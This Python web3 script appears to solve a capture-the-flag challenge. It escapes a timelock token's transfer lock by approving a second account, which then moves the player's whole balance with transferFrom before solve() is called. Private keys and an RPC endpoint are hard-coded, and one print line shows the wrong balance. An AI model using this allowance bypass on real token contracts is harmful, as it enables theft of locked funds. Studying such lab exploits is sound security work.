#!/usr/bin/env python3
from web3 import Web3
from eth_account import Account
from eth_account.signers.base import BaseAccount
import time

# -----------------------
# Config — edit if needed
# -----------------------
RPC = "http://161.97.155.116:8545/WXcZNwxllVPZsaFjhUdXQnjp/main"
PK_PLAYER = "0xcb30be9195d5424ff3a63970d8e18759d1d761c87c4d0bfdf9056fe2f81d0d03"
PK_SPENDER = "0xce4834109dcc7c32eb620bd5c25daf540ba45f8ff93ac3d3de7f1578d6c95805"
CHALL_ADDR = "0x7Ba6285C2845cceBd5e277E13Fb9835c7C5f1eDa"  # Challenge contract address

# -----------------------
# Setup
# -----------------------
w3 = Web3(Web3.HTTPProvider(RPC))
assert w3.is_connected(), "Cannot connect to RPC"

player_acct = Account.from_key(PK_PLAYER)
spender_acct = Account.from_key(PK_SPENDER)

player = w3.to_checksum_address(player_acct.address)
spender = w3.to_checksum_address(spender_acct.address)
challenge_addr = w3.to_checksum_address(CHALL_ADDR)

print("Connected:", w3.is_connected())
print("Player address:", player)
print("Spender address:", spender)
print("Challenge address:", challenge_addr)
print("Chain ID:", w3.eth.chain_id)
print("Latest block:", w3.eth.block_number)

balance_eth = w3.eth.get_balance(player_acct.address)
print("Player ETH balance (wei):", balance_eth)
print("Player ETH balance (ETH):", w3.from_wei(balance_eth, "ether"))


# Send minimal ETH from player to spender for gas
fund_tx = {
    "from": player,
    "to": spender,
    "value": w3.to_wei(0.01, "ether"),  # enough for gas
    "nonce": w3.eth.get_transaction_count(player),
    "gas": 21000,
    "gasPrice": w3.to_wei(1, "gwei"),
    "chainId": w3.eth.chain_id
}
signed_fund = Account.sign_transaction(fund_tx, PK_PLAYER)
txh_fund = w3.eth.send_raw_transaction(signed_fund.raw_transaction)
w3.eth.wait_for_transaction_receipt(txh_fund)

balance_eth2 = w3.eth.get_balance(spender_acct.address)
print("Spender ETH balance (wei):", balance_eth2)
print("Spender ETH balance (ETH):", w3.from_wei(balance_eth, "ether"))

# -----------------------
# Minimal ABIs
# -----------------------
CHALLENGE_ABI = [
    {"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"CONTRACT","outputs":[{"internalType":"contract Timelock","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"PLAYER","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
]

ERC20_MIN_ABI = [
    # balanceOf
    {"constant": True, "inputs":[{"name":"_owner","type":"address"}], "name":"balanceOf",
     "outputs":[{"name":"balance","type":"uint256"}], "type":"function", "stateMutability":"view"},
    # approve
    {"constant": False, "inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],
     "name":"approve", "outputs":[{"name":"ok","type":"bool"}], "type":"function", "stateMutability":"nonpayable"},
    # transferFrom
    {"constant": False, "inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],
     "name":"transferFrom", "outputs":[{"name":"ok","type":"bool"}], "type":"function", "stateMutability":"nonpayable"}
]

# -----------------------
# Contract objects
# -----------------------
challenge = w3.eth.contract(address=challenge_addr, abi=CHALLENGE_ABI)

# read timelock address from challenge.CONTRACT()
timelock_addr = challenge.functions.CONTRACT().call()
timelock_addr = w3.to_checksum_address(timelock_addr)
print("Timelock token address (from Challenge.CONTRACT()):", timelock_addr)

token = w3.eth.contract(address=timelock_addr, abi=ERC20_MIN_ABI)

# -----------------------
# Get player's token balance
# -----------------------
player_token_balance = token.functions.balanceOf(player).call()
print("Player token balance (raw units):", player_token_balance)
if player_token_balance == 0:
    print("Player already has zero tokens. Try calling solve() directly.")
    # optionally call solve below
else:
    # -----------------------
    # 1) Player approves spender to spend player's tokens
    # -----------------------
    print("Building approve(...) transaction from player -> spender ...")
    nonce = w3.eth.get_transaction_count(player)
    approve_tx = token.functions.approve(spender, player_token_balance).build_transaction({
        "from": player,
        "nonce": nonce,
        "gas": 100_0000 ,
        "gasPrice": w3.to_wei("1", "gwei"),
        "chainId": w3.eth.chain_id
    })

    signed_approve = Account.sign_transaction(approve_tx, PK_PLAYER)
    txh = w3.eth.send_raw_transaction(signed_approve.raw_transaction)
    print("approve tx sent:", txh.hex())
    rec = w3.eth.wait_for_transaction_receipt(txh, timeout=120)
    

    # sanity: check allowance by trying transferFrom from spender in next step

    # -----------------------
    # 2) Spender calls transferFrom(player, recipient, amount)
    #    We'll send tokens to the challenge contract itself (recipient) so player's balance becomes 0
    # -----------------------
    recipient = challenge_addr  # choose recipient; must not be player
    print(f"Calling transferFrom(from=player, to={recipient}, amount={player_token_balance}) from spender account...")

    nonce_spender = w3.eth.get_transaction_count(spender)
    transfer_tx = token.functions.transferFrom(player, recipient, player_token_balance).build_transaction({
        "from": spender,
        "nonce": nonce_spender,
        "gas": 200_000,
        "gasPrice": w3.to_wei("1", "gwei"),
        "chainId": w3.eth.chain_id
    })

    signed_transfer = Account.sign_transaction(transfer_tx, PK_SPENDER)
    txh2 = w3.eth.send_raw_transaction(signed_transfer.raw_transaction)
    print("transferFrom tx sent (spender):", txh2.hex())
    rec2 = w3.eth.wait_for_transaction_receipt(txh2, timeout=120)

    # Confirm player's balance is now zero
    new_balance = token.functions.balanceOf(player).call()
    print("Player new token balance:", new_balance)

# -----------------------
# 3) Call Challenge.solve() from player (signed)
# -----------------------
print("Building Challenge.solve() transaction from player...")
nonce = w3.eth.get_transaction_count(player)
solve_tx = challenge.functions.solve().build_transaction({
    "from": player,
    "nonce": nonce,
    "gas": 200_000,
    "gasPrice": w3.to_wei("1", "gwei"),
    "chainId": w3.eth.chain_id
})
signed_solve = Account.sign_transaction(solve_tx, PK_PLAYER)
txh3 = w3.eth.send_raw_transaction(signed_solve.raw_transaction)
print("solve tx sent:", txh3.hex())
rec3 = w3.eth.wait_for_transaction_receipt(txh3, timeout=120)

# Final check
solved = challenge.functions.isSolved().call()
print("isSolved() ->", solved)
